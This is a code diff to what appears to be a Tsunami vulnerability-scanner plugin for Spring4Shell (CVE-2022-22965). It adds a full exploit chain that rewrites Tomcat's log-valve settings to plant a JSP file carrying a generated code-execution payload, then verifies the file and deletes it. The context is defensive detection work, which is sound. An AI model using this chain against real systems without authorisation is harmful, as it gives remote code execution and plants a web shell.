@@ -21,28 +21,45 @@ import static com.google.tsunami.common.net.http.HttpRequest.get;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 
 import com.google.common.collect.ImmutableList;
+import com.google.common.collect.ImmutableMap;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
+import com.google.tsunami.common.net.http.HttpHeaders;
+import com.google.tsunami.common.net.http.HttpMethod;
+import com.google.tsunami.common.net.http.HttpRequest;
 import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.net.http.HttpStatus;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
+import com.google.tsunami.plugin.payload.Payload;
+import com.google.tsunami.plugin.payload.PayloadGenerator;
 import com.google.tsunami.proto.CrawlResult;
 import com.google.tsunami.proto.DetectionReport;
 import com.google.tsunami.proto.DetectionReportList;
 import com.google.tsunami.proto.DetectionStatus;
 import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
 import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
+import okhttp3.HttpUrl;
+
 import java.io.IOException;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 import javax.inject.Inject;
 
 /** A {@link VulnDetector} that detects Spring Framework RCE(CVE-2022-22965) */
@@ -56,18 +73,33 @@ import javax.inject.Inject;
 public final class SpringCve202222965Detector implements VulnDetector {
 
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
-  private static final String VULNERABILITY_PAYLOAD_STRING_1 =
-      "class.module.classLoader.DefaultAssertionStatus=1";
-  private static final String VULNERABILITY_PAYLOAD_STRING_2 =
-      "class.module.classLoader.DefaultAssertionStatus=2";
+  private static final String PRELIMINARY_CHECK_PARAM =
+      "class.module.classLoader.DefaultAssertionStatus";
+  // A payload to append to the JSP file that will allow to delete the file itself
+  private static final String JSP_CONTENT_TEMPLATE =
+          "<%@ page import=\"java.io.File\" %>\n{{PAYLOAD}}\n<% if(\"1\".equals(request.getParameter(\"delete\"))){ File thisFile=new File(application.getRealPath(request.getServletPath())); thisFile.delete(); out.println(\"Deleted\"); } %>//";
+  private static final String JSP_FILENAME = "Tsunami" + System.currentTimeMillis();
+
+  private static final Map<String, String> LOG_CONFIG_PARAMS = ImmutableMap.of(
+          "class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".jsp",
+          "class.module.classLoader.resources.context.parent.pipeline.first.directory", "webapps/ROOT",
+          "class.module.classLoader.resources.context.parent.pipeline.first.prefix", JSP_FILENAME,
+          "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", ""
+  );
+  private static final String LOG_FILE_DATE_FORMAT_QS = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_";
+  private static final String LOG_PATTERN_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.pattern";
+
 
   private final Clock utcClock;
   private final HttpClient httpClient;
+  private final PayloadGenerator payloadGenerator;
+
 
   @Inject
-  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
+    this.payloadGenerator = checkNotNull(payloadGenerator);
   }
 
   @Override
@@ -112,61 +144,249 @@ public final class SpringCve202222965Detector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    if (proofOfConcept(
-        NetworkServiceUtils.buildWebApplicationRootUrl(networkService), "GET", networkService)) {
+    // Check root URL
+    if (check(
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService), HttpMethod.GET, networkService)) {
       return true;
     }
-    if (networkService.getServiceContext().getWebServiceContext().getCrawlResultsCount() == 0) {
-      return false;
-    }
+
+    // Check crawled pages
     for (CrawlResult crawlResult :
         networkService.getServiceContext().getWebServiceContext().getCrawlResultsList()) {
       String targetUri = crawlResult.getCrawlTarget().getUrl();
-      String httpMethod = crawlResult.getCrawlTarget().getHttpMethod();
-      if (proofOfConcept(targetUri, httpMethod, networkService)) {
+      HttpMethod httpMethod = HttpMethod.valueOf(crawlResult.getCrawlTarget().getHttpMethod());
+      if (check(targetUri, httpMethod, networkService)) {
         return true;
       }
     }
     return false;
   }
 
-  private boolean proofOfConcept(
-      String targetUri, String httpMethod, NetworkService networkService) {
-    HttpResponse firstPoCResponse;
-    HttpResponse secondPoCResponse;
+  private boolean check(String targetUri, HttpMethod httpMethod, NetworkService networkService) {
+    if (!preliminaryCheck(targetUri, httpMethod, networkService)) {
+      return false;
+    }
+
+    logger.atInfo().log("Preliminary check returned positive for %s", targetUri);
+    return exploit(targetUri, httpMethod, networkService);
+  }
+
+  private boolean preliminaryCheck(
+      String targetUri, HttpMethod httpMethod, NetworkService networkService) {
+    /*
+    This method will try a preliminary detection method without running the full exploit.
+    Since DefaultAssertionStatus is a boolean, setting it to 1 should not return any error,
+    but trying to set it to 2 should return a BAD REQUEST error.
+     */
     try {
-      switch (httpMethod) {
-        case "GET":
-          firstPoCResponse =
-              httpClient.send(
-                  get(targetUri + "?" + VULNERABILITY_PAYLOAD_STRING_1).withEmptyHeaders().build(),
-                  networkService);
-          secondPoCResponse =
-              httpClient.send(
-                  get(targetUri + "?" + VULNERABILITY_PAYLOAD_STRING_2).withEmptyHeaders().build(),
-                  networkService);
-          break;
-        case "POST":
-          firstPoCResponse =
-              httpClient.send(
-                  post(targetUri + "?" + VULNERABILITY_PAYLOAD_STRING_1).withEmptyHeaders().build(),
-                  networkService);
-          secondPoCResponse =
-              httpClient.send(
-                  post(targetUri + "?" + VULNERABILITY_PAYLOAD_STRING_2).withEmptyHeaders().build(),
-                  networkService);
-          break;
-        default:
-          logger.atWarning().log("Unable to query '%s'.", targetUri);
-          return false;
+      HttpRequest request = HttpRequest.builder()
+              .setMethod(httpMethod)
+              .setUrl(targetUri + "?" + PRELIMINARY_CHECK_PARAM + "=1")
+              .withEmptyHeaders()
+              .build();
+
+      if (httpClient.send(request, networkService).status() != HttpStatus.OK) {
+        return false;
       }
-      if (firstPoCResponse.status() == HttpStatus.OK
-          && secondPoCResponse.status() == HttpStatus.BAD_REQUEST) {
+
+      request = HttpRequest.builder()
+              .setMethod(httpMethod)
+              .setUrl(targetUri + "?" + PRELIMINARY_CHECK_PARAM + "=2")
+              .withEmptyHeaders()
+              .build();
+
+      if (httpClient.send(request, networkService).status() == HttpStatus.BAD_REQUEST) {
         return true;
       }
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
     }
+    return false;
+  }
+
+  private static String buildQueryString(Map<String, String> parameters) {
+    List<String> params = new ArrayList<>(parameters.size());
+    for (Map.Entry<String, String> entry : parameters.entrySet()) {
+      params.add(String.format("%s=%s", entry.getKey(), URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8)));
+    }
+    return String.join("&", params);
+  }
+
+
+  private boolean exploit(String targetUri, HttpMethod httpMethod, NetworkService networkService) {
+    // Generate JSP content
+    PayloadGeneratorConfig payloadGeneratorConfig = PayloadGeneratorConfig.newBuilder()
+            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+            .setInterpretationEnvironment(PayloadGeneratorConfig.InterpretationEnvironment.JSP)
+            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
+            .build();
+
+    Payload payload = this.payloadGenerator.generate(payloadGeneratorConfig);
+
+    return uploadJsp(targetUri, httpMethod, networkService, payload) && checkUploadedJsp(targetUri, networkService, payload);
+  }
+
+  private boolean uploadJsp(String targetUri, HttpMethod httpMethod, NetworkService networkService, Payload payload) {
+    /*
+     From https://github.com/lunasec-io/Spring4Shell-POC/blob/master/exploit.py
+     The exploit involves modifying the logs configuration to write a JSP file in
+     Tomcat's root directory. The file is written on the request AFTER the one setting
+     the configuration.
+     */
+
+    HttpHeaders httpHeaders = HttpHeaders.builder().addHeader("Connection", "close").build();
+
+    try {
+      // Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
+      // If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
+      // Running this in case there already was an exploit attempt on this instance
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
+      httpClient.send(
+              HttpRequest.builder()
+                      .setMethod(httpMethod)
+                      .setUrl(targetUri + "?" + LOG_FILE_DATE_FORMAT_QS)
+                      .setHeaders(httpHeaders)
+                      .build(),
+              networkService
+      );
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
+      httpClient.send(
+              HttpRequest.builder()
+                      .setMethod(HttpMethod.GET)
+                      .setUrl(targetUri)
+                      .setHeaders(httpHeaders)
+                      .build(),
+              networkService
+      );
+
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
+
+      // Generate JSP content
+      logger.atInfo().log("Setting log configuration to write JSP file.");
+      String jspContent = JSP_CONTENT_TEMPLATE
+              .replace("{{PAYLOAD}}", payload.getPayload())
+              .replace("%", "%{perc}i")
+              .replace("Runtime", "%{rt}i");
+
+      Map<String, String> params = new HashMap<>(LOG_CONFIG_PARAMS);
+      params.put(LOG_PATTERN_PARAM, jspContent);
+
+      // Modifying logs configuration
+      httpClient.send(
+              HttpRequest.builder()
+                      .setMethod(httpMethod)
+                      .setUrl(targetUri + "?" + buildQueryString(params))
+                      .setHeaders(httpHeaders)
+                      .build(),
+              networkService
+      );
+
+      // Wait for changes to propagate
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
+
+      // Send an arbitrary request to trigger the file writing
+      // The headers are needed to generate the content correctly
+      logger.atInfo().log("Triggering JSP file write.");
+      HttpHeaders headers = HttpHeaders.builder()
+                      .addHeader("perc", "%")
+                      .addHeader("rt", "Runtime")
+                      .addHeader("Connection", "close")
+                      .build();
+      httpClient.send(
+              HttpRequest.builder()
+                      .setMethod(HttpMethod.GET)
+                      .setUrl(targetUri)
+                      .setHeaders(headers)
+                      .build(),
+              networkService
+      );
+      httpClient.send(
+              HttpRequest.builder()
+                      .setMethod(HttpMethod.GET)
+                      .setUrl(targetUri)
+                      .setHeaders(headers)
+                      .build(),
+              networkService
+      );
+      httpClient.send(
+              HttpRequest.builder()
+                      .setMethod(HttpMethod.GET)
+                      .setUrl(targetUri)
+                      .setHeaders(headers)
+                      .build(),
+              networkService
+      );
+
+      // Wait for file to be written
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
+
+      // Reset the pattern to prevent further data being written to the file
+      logger.atInfo().log("Resetting log configuration.");
+      httpClient.send(
+              HttpRequest.builder()
+                      .setMethod(httpMethod)
+                      .setUrl(targetUri + "?" + LOG_PATTERN_PARAM + "=")
+                      .setHeaders(httpHeaders)
+                      .build(),
+              networkService
+      );
+    } catch (IOException e) {
+      return false;
+    }
+    return true;
+  }
+
+  private boolean checkUploadedJsp(String targetUri, NetworkService networkService, Payload payload) {
+    List<String> urlsToCheck = new ArrayList<>();
+    String tempUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
+    urlsToCheck.add(tempUrl + JSP_FILENAME + ".jsp");
+
+    // The JSP file may be in any subpath from our original target URI
+    List<String> pathSegments = HttpUrl.parse(targetUri).pathSegments();
+    if (pathSegments.size() > 1) {
+      for(String segment: pathSegments) {
+        tempUrl += segment + "/";
+        urlsToCheck.add(String.format("%s%s.jsp", tempUrl, JSP_FILENAME));
+      }
+    }
+
+    HttpHeaders httpHeaders = HttpHeaders.builder().addHeader("Connection", "close").build();
+    for (String url : urlsToCheck) {
+      try {
+        HttpResponse response = httpClient.send(
+                get(url)
+                        .setHeaders(httpHeaders)
+                        .build(),
+                networkService
+        );
+
+        if (response.status() == HttpStatus.OK) {
+          logger.atInfo().log("==================== " + response.bodyString().get());
+        }
+
+        if (
+                response.status() == HttpStatus.OK
+                && payload.checkIfExecuted(response.bodyString().orElse(""))
+        ) {
+          logger.atInfo().log("Vulnerability confirmed via JSP file uploaded at %s", url);
+
+          // Cleanup
+          logger.atInfo().log("Triggering JSP file deletion.");
+          httpClient.send(
+                  get(url + "?delete=1")
+                          .setHeaders(httpHeaders)
+                          .build(),
+                  networkService
+          );
+
+          return true;
+        }
+      } catch (IOException e) {
+        logger.atWarning().withCause(e).log("Unable to query '%s'.", url);
+        continue;
+      }
+    }
+    logger.atWarning().log("Could not find any uploaded JSP file. Target is probably not vulnerable.");
     return false;
   }
 
